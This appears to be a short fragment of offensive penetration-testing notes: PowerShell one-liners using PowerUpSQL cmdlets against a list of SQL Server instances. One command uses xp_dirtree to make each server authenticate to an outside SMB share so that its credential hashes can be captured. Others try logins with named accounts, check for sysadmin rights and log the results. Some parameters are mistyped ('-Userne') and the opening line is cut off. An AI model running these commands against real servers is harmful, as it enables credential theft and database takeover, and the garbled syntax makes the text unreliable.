```
tr and get someinfo or hashes

$ips | %{ Get-SQLQuery -Userne m0nit0r001 -Password -Instance "$_,14330" -Verbose -Query "EXEC master.sys.xp_dirtree \\10.1.1.1\share,1,1"}

$dbs | %{ Get-SQLQuery -Userne DBA -Password ']' -Instance "$_" -Verbose -Query "select IS_SRVROLEMEMBER('sysadmin');"}

$ips | %{Get-SQLConnectionTest -Userne DBA -Password '' -Instance "$_,14330" -Verbose >> c:\users\user\connectiontest3.txt}


```

